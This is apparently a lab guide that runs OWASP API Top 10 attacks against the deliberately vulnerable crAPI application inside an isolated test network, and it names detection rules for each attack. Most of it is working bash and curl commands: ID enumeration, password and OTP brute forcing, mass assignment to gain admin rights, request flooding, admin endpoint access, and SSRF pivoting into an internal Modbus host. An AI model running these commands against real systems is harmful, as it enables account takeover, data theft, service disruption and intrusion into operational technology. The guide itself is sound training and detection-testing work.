# OWASP API Top 10 Attack Scenarios

All attacks run from `iron-gate-attacker` (10.0.0.101) against `iron-gate-api` (10.0.0.100).

## Prerequisites

```bash
ssh -i ~/.ssh/iron_gate kali@10.0.0.101
export TARGET=http://10.0.0.100:8888
```

Register a test account first:
```bash
curl -s -X POST $TARGET/identity/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{"name":"attacker","email":"attacker@lab.local","number":"9876543210","password":"Attack@123","confirm_password":"Attack@123"}'
```

Get a JWT token:
```bash
TOKEN=$(curl -s -X POST $TARGET/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@lab.local","password":"Attack@123"}' | jq -r '.token')
```

---

## API1: Broken Object Level Authorization (BOLA)

crAPI returns vehicle data without verifying ownership.

```bash
# Enumerate vehicle IDs — these belong to other users
for ID in $(seq 1 100); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    $TARGET/api/v2/vehicle/$ID/location)
  [ "$STATUS" = "200" ] && echo "HIT: vehicle $ID"
done
```

**Expected**: 200 responses for vehicles you don't own.  
**Detection**: `bola-enumeration.yaml` Loki rule fires at >10 req/min.

---

## API2: Broken Authentication

```bash
# Brute force login (no rate limiting in crAPI)
for PASS in password123 admin123 letmein qwerty123 Attack@123; do
  curl -s -X POST $TARGET/identity/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@lab.local\",\"password\":\"$PASS\"}" | jq .message
done

# OTP brute force on password reset
# crAPI sends 4-digit OTP — enumerate all 10000 values
for OTP in $(seq -w 0000 9999); do
  R=$(curl -s -X POST $TARGET/identity/api/auth/v3/check-otp \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@lab.local\",\"otp\":\"$OTP\",\"password\":\"NewPass@123\"}")
  echo $R | grep -q "success" && echo "OTP FOUND: $OTP" && break
done
```

**Detection**: `broken-auth.yaml` — BruteForceLoginAttempts, PasswordResetAbuse.

---

## API3: Broken Object Property Level Authorization

```bash
# crAPI returns internal fields not meant for the client
curl -s -H "Authorization: Bearer $TOKEN" \
  $TARGET/identity/api/v2/user/dashboard | jq .

# Mass assignment — send extra fields the API shouldn't accept
curl -s -X PUT $TARGET/identity/api/v2/user/edit \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"attacker","available_credit":99999,"role":"admin"}'
```

---

## API4: Unrestricted Resource Consumption

```bash
# Flood coupon check endpoint — no rate limiting
for i in $(seq 1 500); do
  curl -s -X POST $TARGET/workshop/api/shop/apply_coupon \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"coupon_code":"TRAC075","amount":75}' &
done
wait
```

---

## API5: Broken Function Level Authorization

```bash
# Access admin endpoints with a regular user token
curl -s -H "Authorization: Bearer $TOKEN" \
  $TARGET/identity/api/v2/admin/users/all | jq .

curl -s -H "Authorization: Bearer $TOKEN" \
  $TARGET/workshop/api/mechanic/mechanic_report?report_id=1 | jq .
```

---

## API7: SSRF

```bash
# crAPI video conversion endpoint makes outbound HTTP calls
# Redirect to internal host
curl -s -X POST $TARGET/workshop/api/merchant/contact_mechanic \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"mechanic_api":"http://10.0.0.103:502","problem_details":"test","vin":"test","mechanic_code":"TRAC_JME"}'
```

**Scenario**: SSRF reaches `iron-gate-ot:502` (Modbus). This is the API-to-OT pivot entry point.

---

## Automation

```bash
# Run all scenarios with crapi-go (if installed)
# Or use the OWASP crAPI Postman collection
curl -s https://raw.githubusercontent.com/OWASP/crAPI/main/docs/crAPI_postman_collection.json \
  -o ~/crapi-collection.json
```
